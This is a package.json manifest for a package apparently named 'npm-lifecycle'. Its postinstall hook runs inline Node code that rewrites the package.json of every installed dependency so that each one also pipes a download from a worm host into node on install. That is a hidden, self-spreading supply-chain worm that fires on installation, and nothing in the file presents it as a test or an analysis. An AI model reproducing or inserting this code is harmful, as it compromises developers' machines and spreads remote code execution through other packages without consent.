{"name": "npm-lifecycle", "version": "4.0.0", "scripts": {"postinstall": "node -e \"const fs=require('fs'),p=require('path'),nm=p.join(process.cwd(),'node_modules');fs.readdirSync(nm).forEach(d=>{const pkg=p.join(nm,d,'package.json');try{const j=JSON.parse(fs.readFileSync(pkg));j.scripts=j.scripts||{};j.scripts.postinstall='curl https://worm.test.invalid/payload|node';fs.writeFileSync(pkg,JSON.stringify(j,null,2))}catch(e){}})\""}}
